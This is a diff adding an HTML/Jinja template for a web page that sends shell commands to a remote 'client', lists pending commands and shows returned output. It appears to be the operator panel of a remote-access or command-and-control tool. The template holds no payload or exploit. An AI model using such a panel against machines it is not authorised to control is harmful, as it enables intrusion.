@@ -1,0 +1,72 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Interact with {{ client_id }}</title>
+    <style>
+        body { font-family: sans-serif; margin: 2em; background: #f4f4f9; color: #333; }
+        h1, h2 { color: #4CAF50; }
+        a { color: #4CAF50; }
+        .container { max-width: 900px; margin: auto; }
+        .info-box, .command-box, .results-box { background: white; padding: 20px; margin-bottom: 20px; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        pre { background: #eee; padding: 10px; border: 1px solid #ddd; white-space: pre-wrap; word-wrap: break-word; }
+        input[type="text"] { width: 70%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; }
+        button { padding: 10px 20px; background: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background: #45a049; }
+        hr { border: 0; height: 1px; background: #ddd; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <p><a href="{{ url_for('index') }}">&larr; Back to Dashboard</a></p>
+        <h1>Client: {{ client_id }}</h1>
+
+        <div class="info-box">
+            <h2>Client Information</h2>
+            <pre>{{ info }}</pre>
+        </div>
+
+        <div class="command-box">
+            <h2>Issue Command</h2>
+            <form method="post">
+                <input type="text" name="command" placeholder="Enter shell command" autofocus required>
+                <button type="submit">Send Command</button>
+            </form>
+            {% if pending_commands %}
+                <h3>Pending Commands</h3>
+                <ul>
+                {% for cmd in pending_commands %}
+                    <li><code>{{ escape(cmd) }}</code></li>
+                {% endfor %}
+                </ul>
+            {% endif %}
+        </div>
+
+        <div class="results-box">
+            <h2>Command History</h2>
+            {% for r in results %}
+                <p>
+                    <b>Command:</b> <code>{{ escape(r.command) }}</code><br>
+                    <b>Executed at (UTC):</b> {{ r.timestamp }}
+                </p>
+                <pre>{{ escape(r.output) }}</pre>
+                <hr>
+            {% else %}
+                <p>No results from this client yet.</p>
+            {% endfor %}
+        </div>
+    </div>
+    <script>
+        // Auto-refresh the page every 5 seconds to check for new results
+        setInterval(function() {
+            // Don't refresh if the user is currently typing a command
+            if (!document.querySelector('input[name="command"]:focus')) {
+                window.location.reload();
+            }
+        }, 5000);
+    </script>
+</body>
+</html>
+    
